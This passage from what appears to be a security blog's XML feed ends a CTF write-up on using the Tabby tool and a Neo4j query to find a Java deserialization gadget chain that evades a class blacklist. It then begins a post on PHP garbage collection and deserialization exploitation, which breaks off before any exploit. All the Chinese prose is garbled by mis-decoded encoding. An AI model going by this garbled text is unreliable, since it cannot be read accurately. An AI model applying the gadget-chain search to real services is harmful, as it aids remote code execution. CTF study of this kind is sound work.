alt="image-20230504091725958"></p></li><li><p>ä¸Šè¿°æŸ¥è¯¢è¯­å¥ä¸­equalsæ–¹æ³•åä¸º<code>[:ALIAS*..2]</code></p><ul><li><code>*1..N</code>çš„æ„æ€å³ä¸ºï¼šå¦‚æœåœ¨1åˆ°Nå±‚å…³ç³»ä¸­å­˜åœ¨è·¯å¾„ï¼Œå°†è¿”å›å¼€å§‹ç‚¹å’Œç»“æŸç‚¹ï¼Œè‹¥ç¼ºçœå¼€å¤´ï¼Œåˆ™é»˜è®¤ä»1å¼€å§‹ï¼Œæ‰€ä»¥<code>[:ALIAS*..2]</code>è¡¨ç¤ºæ‰¾ä¸¤å±‚ä»¥å†…çš„æ–¹æ³•</li></ul></li><li><p>åœ¨Neo4jæŸ¥è¯¢è¯­å¥CQLä¸­å¯ä»¥è®¾å®šæŒ‡å®šæ–¹å‘ï¼Œå¦‚<code>-[:CALL ]-&gt;</code>,è€Œ<code>-[:ALIAS*1..2]-</code>æ²¡æœ‰æŒ‡å®šæ–¹å‘ï¼Œè¯´æ˜å…³ç³»å†…çš„æ–¹æ³•åªèƒ½ä½œä¸ºalias,å¯ä»¥ç†è§£ä¸ºä»å½“å‰èŠ‚ç‚¹å‘å¤–å¹¿åº¦å»¶ä¼¸ä»¥æœç´¢èƒ½è°ƒç”¨åˆ°ä¸‹ä¸€ä¸ªæ–¹æ³•èŠ‚ç‚¹çš„è°ƒç”¨é“¾</p></li><li><p>æ¯ä¸ªèŠ‚ç‚¹éƒ½æœ‰ä¸¤ä¸ªå±æ€§ IS_SINK IS_SOURCE ï¼Œåˆ†åˆ«ä»£è¡¨æ˜¯å¦æ˜¯ç»“å°¾èŠ‚ç‚¹å’Œèµ·å§‹èŠ‚ç‚¹</p></li></ul><p>æ ¹æ®æŸ¥è¯¢ç»“æœå¾ˆå®¹æ˜“å‘ç°è°ƒç”¨é“¾</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041322538.png" alt="image-20230504123909760"></p><h2 id="0x02CTFä¸­ä½¿ç”¨"><a href="#0x02CTFä¸­ä½¿ç”¨" class="headerlink" title="0x02CTFä¸­ä½¿ç”¨"></a>0x02CTFä¸­ä½¿ç”¨</h2><p>ä¸Šé¢æ‰¾ccé“¾çš„è¿‡ç¨‹æŒ‡å‘æ€§æ¯”è¾ƒå¼ºï¼Œåœ¨ctfä¸­ï¼Œå¯ä»¥åˆ©ç”¨è¯¥å·¥å…·æ‰¾åˆ°ä¸¤ä¸ªæ–¹æ³•ä¹‹é—´çš„è°ƒç”¨é“¾</p><h3 id="é•¿åŸæ¯-2022-b4bycoffee"><a href="#é•¿åŸæ¯-2022-b4bycoffee" class="headerlink" title="[é•¿åŸæ¯ 2022]b4bycoffee"></a>[é•¿åŸæ¯ 2022]b4bycoffee</h3><p>é¢˜ç›®ç»™å‡ºæºç ï¼Œåç¼–è¯‘ä¸€ä¸‹ï¼ŒcoffeeBeançš„toStringæœ‰ä¸ªå­—èŠ‚ç åé—¨</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041322562.png" alt="image-20230504124900205"></p><p>ååºåˆ—åŒ–å…¥å£ï¼Œè·Ÿè¿›ä¸€ä¸‹AntObjectInputStream</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041323091.png" alt="image-20230504125123715"></p><p>åœ¨ååºåˆ—åŒ–æ—¶è®¾ç½®äº†é»‘åå•ç±»ï¼Œè¿‡æ»¤äº†è¿™äº›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">BadAttributeValueExpException,ObjectBean,ToStringBean,TemplatesImpl,Runtime<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041323797.png" alt="image-20230504125216104"></p><p>ç°åœ¨åªè¦è§¦å‘toStringï¼Œä½†æ˜¯å¸¸ç”¨çš„BadAttributeValueExpExceptionè¢«banäº†ï¼Œæ³¨æ„åˆ°ä¾èµ–ä¸­å­˜åœ¨romeï¼Œå¯ä»¥ç”¨EqualsBeançš„hashcodeæ–¹æ³•å¯ä»¥è§¦å‘åˆ°ä»»æ„ç±»çš„toStringæ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041323020.png" alt="image-20230504125407054"></p><p>ä½†æ˜¯è¿™é¢˜ä¹Ÿå¯ä»¥ç”¨tabbyæ‰¾ä¸€ä¸ªreadObject-&gt;toStringçš„é“¾å­ï¼Œå†™å‡ºä»¥ä¸‹æŸ¥è¯¢è¯­å¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cql">match (source:Method &#123;NAME:&quot;readObject&quot;,CLASSNAME:&quot;java.util.HashMap&quot;&#125;)<br>match (sink:Method &#123;NAME:&quot;toString&quot;&#125;)<br>with source, collect(sink) as sinks<br>call tabby.algo.findJavaGadget(source, sinks, 12, false,true) yield path where none(n in nodes(path) where n.CLASSNAME in [&quot;javax.management.BadAttributeValueExpException&quot;,&quot;com.sun.jmx.snmp.SnmpEngineId&quot;,&quot;com.sun.xml.internal.ws.api.BindingID&quot;,&quot;javax.swing.text.html.HTML$UnknownTag&quot;])<br>return path limit 1<br></code></pre></td></tr></table></figure><blockquote><p>è®¾ç½®èµ·å§‹èŠ‚ç‚¹ä¸ºHashMapçš„readObjectï¼Œç»“æŸèŠ‚ç‚¹ä¸ºtoStringæ–¹æ³•</p><p>ä¹‹åæ’é™¤äº†BadAttributeValueExpExceptionç­‰æ–¹æ³•</p><p>tabbyå†…çš„findJavaGadgetæ¥å£ä¼šé€šè¿‡æ±¡ç‚¹ä¼ æ’­ï¼Œæ ¹æ®javaåŸç”Ÿååºåˆ—åŒ–çš„è§„åˆ™æ¥æŸ¥æ‰¾åˆ©ç”¨é“¾ï¼Œä¸ªå‚æ•°åˆ†åˆ«è¡¨ç¤ºèµ·å§‹èŠ‚ç‚¹ã€ç»“æŸèŠ‚ç‚¹ã€è·¯å¾„çš„æœ€å¤§èŠ‚ç‚¹æ•°ã€isBackwardã€depthFirst</p></blockquote><p>éå¸¸æ¸…æ™°çš„jdkåŸç”Ÿåˆ©ç”¨é“¾</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041323655.png" alt="image-20230504130444449"></p><h4 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h4><p><a href="https://www.ctfiot.com/64572.html">Javaä»£ç åˆ†æå·¥å…·Tabbyåœ¨CTFä¸­çš„è¿ç”¨ | CTFå¯¼èˆª (ctfiot.com)</a></p><p><a href="https://m0d9.me/2022/10/22/Tabby-%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/">Tabby æºç åˆ†æ | m0d9â€™s blog</a></p><p><a href="https://www.cnblogs.com/ljhdo/p/10929702.html">Neo4j ç¬¬ä¹ç¯‡ï¼šæŸ¥è¯¢æ•°æ®ï¼ˆMatchï¼‰ - æ‚¦å…‰é˜´ - åšå®¢å›­ (cnblogs.com)</a></p><p>[tabby&#x2F;Tabby é£Ÿç”¨æŒ‡åŒ—.md at master Â· wh1t3p1g&#x2F;tabby Â· GitHub](<a href="https://github.com/wh1t3p1g/tabby/blob/master/doc/Tabby">https://github.com/wh1t3p1g/tabby/blob/master/doc/Tabby</a> é£Ÿç”¨æŒ‡åŒ—.md)</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPåƒåœ¾å›æ”¶å™¨ä¸ååºåˆ—åŒ–åˆ©ç”¨</title>
      <link href="/2022/10/20/PHP%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E5%99%A8%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/"/>
      <url>/2022/10/20/PHP%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E5%99%A8%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="PHPåƒåœ¾å›æ”¶å™¨ä¸ååºåˆ—åŒ–åˆ©ç”¨"><a href="#PHPåƒåœ¾å›æ”¶å™¨ä¸ååºåˆ—åŒ–åˆ©ç”¨" class="headerlink" title="PHPåƒåœ¾å›æ”¶å™¨ä¸ååºåˆ—åŒ–åˆ©ç”¨"></a>PHPåƒåœ¾å›æ”¶å™¨ä¸ååºåˆ—åŒ–åˆ©ç”¨</h1><h2 id="åƒåœ¾å›æ”¶æœºåˆ¶"><a href="#åƒåœ¾å›æ”¶æœºåˆ¶" class="headerlink" title="åƒåœ¾å›æ”¶æœºåˆ¶"></a>åƒåœ¾å›æ”¶æœºåˆ¶</h2><p>æŒ‡phpä¼šè‡ªåŠ¨é‡Šæ”¾ç¨‹åºä¸å†éœ€è¦çš„å·²åˆ†é…çš„å†…å­˜å—ã€‚</p><h3 id="PHP5-3ä¹‹å‰"><a href="#PHP5-3ä¹‹å‰" class="headerlink" title="PHP5.3ä¹‹å‰"></a>PHP5.3ä¹‹å‰</h3><p>é‡‡ç”¨å¼•ç”¨è®¡æ•°çš„æ–¹å¼ï¼Œç»™æ¯ä¸ªå†…å­˜å¯¹è±¡åˆ†é…ä¸€ä¸ªè®¡æ•°å™¨ï¼Œæ¯å½“å†…å­˜å¯¹è±¡è¢«å¼•ç”¨æ—¶ï¼Œè®¡æ•°å™¨+1ï¼Œå¼•ç”¨æ’¤é”€å(unset())ï¼Œè®¡æ•°å™¨-1ï¼Œå¯¹æŠ€æœ¯å™¨&#x3D;0æ—¶ï¼Œå¯¹å†…å­˜å¯¹è±¡è¿›è¡Œé”€æ¯ï¼Œåƒåœ¾å›æ”¶æœºåˆ¶å®Œæˆï¼Œphpä¸€ä¸ªç”Ÿå‘½å‘¨æœŸåä¼šé‡Šæ”¾æ­¤è¿›ç¨‹&#x2F;çº¿ç¨‹æ‰€å çš„å†…å®¹</p><p>å­˜åœ¨é—®é¢˜ï¼šä¸¤ä¸ªæˆ–å¤šä¸ªå¯¹è±¡ç›¸äº’å¼•ç”¨ï¼Œä½¿å¾—è®¡æ•°å™¨æ°¸è¿œä¸ä¸º0ï¼Œå¯¼è‡´å†…å­˜å¯¹è±¡æ— æ³•è¢«å›æ”¶</p><h3 id="PHP5-3"><a href="#PHP5-3" class="headerlink" title="PHP5.3"></a>PHP5.3</h3><p>åŠ å…¥å¤æ‚ç®—æ³•æ£€æµ‹å¼•ç”¨ç¯çš„å­˜åœ¨ï¼Œé¿å…å†…å­˜æ³„éœ²ã€‚</p><p>æ¯ä¸ªphpå˜é‡å­˜åœ¨ä¸€ä¸ªå«zvalçš„å˜é‡å®¹å™¨ä¸­ï¼Œå­˜å‚¨äº†å˜é‡çš„ç±»å‹å’Œå€¼ï¼Œè¿˜å­˜å‚¨äº†â€œis_refâ€boolå‹å˜é‡ä»¥æ ‡è¯†è¯¥å˜é‡æ˜¯å¦å±äºå¼•ç”¨é›†åˆï¼›è¿˜æœ‰ä¸€ä¸ªâ€œrefcountâ€ï¼Œç”¨äºè¡¨ç¤ºæŒ‡å‘è¿™ä¸ªzvalå˜é‡å®¹å™¨çš„å˜é‡ä¸ªæ•°ï¼Œæ³¨æ„ï¼Œå¤šä¸ªå˜é‡æ˜¯å¯ä»¥å…±ç”¨ä¸€ä¸ªå˜é‡å®¹å™¨çš„ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;new string&quot;</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$b</span> = <span class="hljs-variable">$a</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;a&#x27;</span> );<br><span class="hljs-keyword">unset</span>( <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span> );<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;a&#x27;</span> );<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä»¥ä¸Šä»£ç ä¼šè¾“å‡º</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">a: (<span class="hljs-attribute">refcount</span>=3, <span class="hljs-attribute">is_ref</span>=0)=&#x27;new string<span class="hljs-string">&#x27; </span><br><span class="hljs-string">a: (refcount=1, is_ref=0)=&#x27;</span>new string<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="PHP7çš„NTSç‰ˆæœ¬"><a href="#PHP7çš„NTSç‰ˆæœ¬" class="headerlink" title="PHP7çš„NTSç‰ˆæœ¬"></a>PHP7çš„NTSç‰ˆæœ¬</h3><p>åœ¨è¯¥ç‰ˆæœ¬ï¼Œä¸Šè¿°é€šè¿‡èµ‹å€¼åŒä¸€ä¸ªå˜é‡çš„æƒ…å†µå·²ç»ä¸ä¼šå†è¢«è®¡æ•°ï¼ŒPHP7ä¸­ï¼Œzvalå¯ä»¥è¢«å¼•ç”¨è®¡æ•°æˆ–ä¸è¢«å¼•ç”¨</p><ul><li>å¯¹äºnullï¼Œboolï¼Œintå’Œdoubleçš„ç±»å‹å˜é‡ï¼Œrefcountæ°¸è¿œä¸ä¼šè®¡æ•°ï¼›</li><li>å¯¹äºå¯¹è±¡ã€èµ„æºç±»å‹ï¼Œrefcountè®¡æ•°å’Œphp5çš„ä¸€è‡´ï¼›</li><li>å¯¹äºå­—ç¬¦ä¸²ï¼Œæœªè¢«å¼•ç”¨çš„å˜é‡è¢«ç§°ä¸ºâ€œå®é™…å­—ç¬¦ä¸²â€ã€‚è€Œé‚£äº›è¢«å¼•ç”¨çš„å­—ç¬¦ä¸²ä¹Ÿä¸è®¡æ•°</li><li>å¯¹äºæ•°ç»„ï¼Œæœªå¼•ç”¨çš„å˜é‡è¢«ç§°ä¸ºâ€œä¸å¯å˜æ•°ç»„â€ã€‚å…¶æ•°ç»„æœ¬èº«è®¡æ•°ä¸php5ä¸€è‡´ï¼Œä½†æ˜¯æ•°ç»„é‡Œé¢çš„æ¯ä¸ªé”®å€¼å¯¹çš„è®¡æ•°ï¼Œåˆ™æŒ‰å‰é¢ä¸‰æ¡çš„è§„åˆ™ï¼ˆå³å¦‚æœæ˜¯å­—ç¬¦ä¸²ä¹Ÿä¸åœ¨è®¡æ•°ï¼‰ï¼›å¦‚æœä½¿ç”¨opcacheï¼Œåˆ™ä»£ç ä¸­çš„å¸¸é‡æ•°ç»„æ–‡å­—å°†è¢«è½¬æ¢ä¸ºä¸å¯å˜æ•°ç»„ã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;æµ‹è¯•å­—ç¬¦ä¸²å¼•ç”¨è®¡æ•°&#x27;</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;new string&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$a</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;a&#x27;</span> );<br><span class="hljs-keyword">unset</span>( <span class="hljs-variable">$b</span>);<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;a&#x27;</span> );<br><span class="hljs-variable">$b</span> = &amp;<span class="hljs-variable">$a</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;a&#x27;</span> );<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;æµ‹è¯•æ•°ç»„å¼•ç”¨è®¡æ•°&#x27;</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>);<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;c&#x27;</span> );<br><span class="hljs-variable">$d</span> = <span class="hljs-variable">$c</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;c&#x27;</span> );<br><span class="hljs-variable">$c</span>[<span class="hljs-number">2</span>]=<span class="hljs-string">&#x27;c&#x27;</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;c&#x27;</span> );<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;æµ‹è¯•intå‹è®¡æ•°&#x27;</span>;<br><span class="hljs-variable">$e</span> = <span class="hljs-number">1</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;e&#x27;</span> );<br></code></pre></td></tr></table></figure><p>è¾“å‡ºå¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">æµ‹è¯•å­—ç¬¦ä¸²å¼•ç”¨è®¡æ•°<br>a:(refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;new string&#x27;</span> (length=<span class="hljs-number">10</span>)<br>a:(refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;new string&#x27;</span> (length=<span class="hljs-number">10</span>)<br>a:(refcount=<span class="hljs-number">2</span>, is_ref=<span class="hljs-number">1</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;new string&#x27;</span> (length=<span class="hljs-number">10</span>) <span class="hljs-comment">//å–åœ°å€å¼•ç”¨æ—¶ä¼šæ”¹å˜</span><br>æµ‹è¯•æ•°ç»„å¼•ç”¨è®¡æ•°<br>c:(refcount=<span class="hljs-number">2</span>, is_ref=<span class="hljs-number">0</span>)<br><span class="hljs-keyword">array</span> (size=<span class="hljs-number">2</span>)<br>  <span class="hljs-number">0</span> =&gt; (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;a&#x27;</span> (length=<span class="hljs-number">1</span>)<br>  <span class="hljs-number">1</span> =&gt; (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;b&#x27;</span> (length=<span class="hljs-number">1</span>)<br>c:(refcount=<span class="hljs-number">3</span>, is_ref=<span class="hljs-number">0</span>) <br><span class="hljs-keyword">array</span> (size=<span class="hljs-number">2</span>)<br>  <span class="hljs-number">0</span> =&gt; (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;a&#x27;</span> (length=<span class="hljs-number">1</span>)<br>  <span class="hljs-number">1</span> =&gt; (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;b&#x27;</span> (length=<span class="hljs-number">1</span>)<br>c:(refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-comment">//æ•°ç»„å€¼æ”¹å˜åï¼Œä¹‹å‰å¼•ç”¨å…¨éƒ¨åºŸå¼ƒ</span><br><span class="hljs-keyword">array</span> (size=<span class="hljs-number">3</span>)<br>  <span class="hljs-number">0</span> =&gt; (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;a&#x27;</span> (length=<span class="hljs-number">1</span>)<br>  <span class="hljs-number">1</span> =&gt; (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;b&#x27;</span> (length=<span class="hljs-number">1</span>)<br>  <span class="hljs-number">2</span> =&gt; (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;c&#x27;</span> (length=<span class="hljs-number">1</span>)<br>æµ‹è¯•<span class="hljs-keyword">int</span>å‹è®¡æ•°e:(refcount=<span class="hljs-number">0</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">int</span> <span class="hljs-number">1</span>  <span class="hljs-comment">//intå‹ä¸è®¡å¼•ç”¨æ¬¡æ•°</span><br></code></pre></td></tr></table></figure><h3 id="å›æ”¶å‘¨æœŸ"><a href="#å›æ”¶å‘¨æœŸ" class="headerlink" title="å›æ”¶å‘¨æœŸ"></a>å›æ”¶å‘¨æœŸ</h3><p>PHPåƒåœ¾å›æ”¶æœºåˆ¶é»˜è®¤æ‰“å¼€ï¼Œå¯ä»¥è®¾ç½®php.iniå€¼çš„<code>zend.enable_gc</code>ï¼Œæˆ–è€…è°ƒç”¨gc_enable() å’Œ gc_disable()å‡½æ•°ã€‚</p><p>å½“åƒåœ¾å›æ”¶æœºåˆ¶æ‰“å¼€æ—¶ï¼Œç®—æ³•åˆ¤æ–­åœ¨æ ¹ç¼“å­˜åŒºæ»¡æ—¶ï¼Œæ‰§è¡Œå¾ªç¯æŸ¥æ‰¾ï¼Œæ ¹ç¼“å­˜åŒºå¤§å°éœ€è¦é€šè¿‡ä¿®æ”¹phpæºç æ–‡ä»¶Zend&#x2F;zend_gc.cä¸­çš„å¸¸é‡GC_ROOT_BUFFER_MAX_ENTRIESï¼Œç„¶åé‡æ–°ç¼–è¯‘PHPï¼Œæ¥ä¿®æ”¹è¿™ä¸ªå€¼ã€‚</p><blockquote><p>è°ƒç”¨gc_disable()å‡½æ•°é‡Šæ”¾å†…å­˜ä¹‹å‰ï¼Œå…ˆè°ƒç”¨gc_collect_cycles()å‡½æ•°ï¼Œä»¥å…æ ¹ç¼“å­˜åŒºç©ºé—´ä¸è¶³</p></blockquote><h3 id="åƒåœ¾çš„äº§ç”Ÿ"><a href="#åƒåœ¾çš„äº§ç”Ÿ" class="headerlink" title="åƒåœ¾çš„äº§ç”Ÿ"></a>åƒåœ¾çš„äº§ç”Ÿ</h3><p>PHPä¸­ä¸€äº›å¤æ‚æ•°æ®ç±»å‹å¤´éƒ¨æœ‰ä¸€ä¸ªGCï¼Œç”¨äºæ”¯æŒåƒåœ¾å›æ”¶ã€‚</p><p>zend_reference è¿™ä¸ªç±»å‹ï¼Œè¿™ä¸ªæ˜¯ PHP7 æ–°å¢çš„å˜é‡ç±»å‹ï¼Œå½“å¯¹å˜é‡ä½¿ç”¨ â€œ&amp;â€ æ“ä½œæ—¶ï¼Œ<u>ä¼šåˆ›å»ºæ–°çš„ä¸­é—´ç»“æ„ä½“ zend_referenceï¼Œè¿™ä¸ªç»“æ„ä½“ä¼šçœŸæ­£çš„æŒ‡å‘å¯¹åº”çš„ value ç»“æ„ã€‚</u></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// å½“è¿›è¡Œå¦‚ä¸‹èµ‹å€¼æ“ä½œæ—¶</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;hello&#x27;</span>; <span class="hljs-comment">// $a -&gt; zend_string</span><br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$a</span>; <span class="hljs-comment">// $b,$a -&gt; zend_string</span><br><span class="hljs-variable">$c</span> = &amp;<span class="hljs-variable">$b</span>; <span class="hljs-comment">// $c,$b -&gt; zval(type = IS_REFERENCE, refcount = 2) -&gt; zend_string</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072213238.png" alt="image-20230405153644317"></p><blockquote><p><code>$bå’Œ$c</code>çš„zvaléƒ½æ˜¯é€šè¿‡ä¸­é—´ç»“æ„ä½“å†æŒ‡å‘æœ€ç»ˆçš„zend_string</p></blockquote><h3 id="å›æ”¶çš„è¿‡ç¨‹"><a href="#å›æ”¶çš„è¿‡ç¨‹" class="headerlink" title="å›æ”¶çš„è¿‡ç¨‹"></a>å›æ”¶çš„è¿‡ç¨‹</h3><p>å¦‚æœå½“å˜é‡çš„ refcount å‡å°åå¤§äº 0ï¼ŒPHP å¹¶ä¸ä¼šç«‹å³å¯¹è¿™ä¸ªå˜é‡è¿›è¡Œåƒåœ¾é‰´å®šå’Œå›æ”¶ï¼Œè€Œæ˜¯æ”¾å…¥ä¸€ä¸ªç¼“å†²åŒºä¸­ï¼Œç­‰è¿™ä¸ªç¼“å†²åŒºæ»¡äº†ä»¥å (10000 ä¸ªå€¼) å†ç»Ÿä¸€è¿›è¡Œå¤„ç†ï¼ŒåŠ å…¥ç¼“å†²åŒºçš„æ˜¯å˜é‡ zend_value é‡Œçš„ gcï¼Œç›®å‰åƒåœ¾åªä¼šå‡ºç°åœ¨æ•°ç»„å’Œå¯¹è±¡ä¸¤ç§ç±»å‹ä¸­ï¼Œæ•°ç»„çš„æƒ…å†µä¸Šé¢å·²ç»ä»‹ç»äº†ï¼Œå¯¹è±¡çš„æƒ…å†µåˆ™æ˜¯æˆå‘˜å±æ€§å¼•ç”¨å¯¹è±¡æœ¬èº«å¯¼è‡´çš„ï¼Œå…¶å®ƒç±»å‹ä¸ä¼šå‡ºç°è¿™ç§å˜é‡ä¸­çš„æˆå‘˜å¼•ç”¨å˜é‡è‡ªèº«çš„æƒ…å†µï¼Œæ‰€ä»¥åƒåœ¾å›æ”¶åªä¼šå¤„ç†è¿™ä¸¤ç§ç±»å‹çš„å˜é‡ã€‚</p><p>gc çš„ç»“æ„ zend_refcounted_h å…·ä½“å¦‚ä¸‹:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_zend_refcounted_h</span> &#123;<br>    <span class="hljs-type">uint32_t</span>         refcount; <span class="hljs-comment">// è®°å½• zend_value çš„å¼•ç”¨æ•°</span><br>    <span class="hljs-keyword">union</span> &#123;<br>        <span class="hljs-keyword">struct</span> &#123;<br>            zend_uchar    type,  <span class="hljs-comment">// zend_valueçš„ç±»å‹, ä¸zval.u1.typeä¸€è‡´</span><br>            zend_uchar    flags, <br>            <span class="hljs-type">uint16_t</span>      gc_info <span class="hljs-comment">// GCä¿¡æ¯ï¼Œè®°å½•åœ¨ gc æ± ä¸­çš„ä½ç½®å’Œé¢œè‰²ï¼Œåƒåœ¾å›æ”¶çš„è¿‡ç¨‹ä¼šç”¨åˆ°</span><br>        &#125; v;<br>        <span class="hljs-type">uint32_t</span> type_info;<br>    &#125; u;<br>&#125; zend_refcounted_h;<br></code></pre></td></tr></table></figure><p>ä¸€ä¸ªå˜é‡åªèƒ½åŠ å…¥ä¸€æ¬¡ç¼“å†²åŒºï¼Œä¸ºäº†é˜²æ­¢é‡å¤åŠ å…¥ï¼Œå˜é‡åŠ å…¥åä¼šæŠŠ zend_refcounted_h.gc_info ç½®ä¸º GC_PURPLEï¼Œå³æ ‡ä¸ºç´«è‰²ï¼Œåç»­ä¸ä¼šé‡å¤æ’å…¥ã€‚</p><h2 id="ååºåˆ—åŒ–ä¸­çš„åˆ©ç”¨"><a href="#ååºåˆ—åŒ–ä¸­çš„åˆ©ç”¨" class="headerlink" title="ååºåˆ—åŒ–ä¸­çš„åˆ©ç”¨"></a>ååºåˆ—åŒ–ä¸­çš„åˆ©ç”¨</h2><h3 id="destructé­”æœ¯æ–¹æ³•"><a href="#destructé­”æœ¯æ–¹æ³•" class="headerlink" 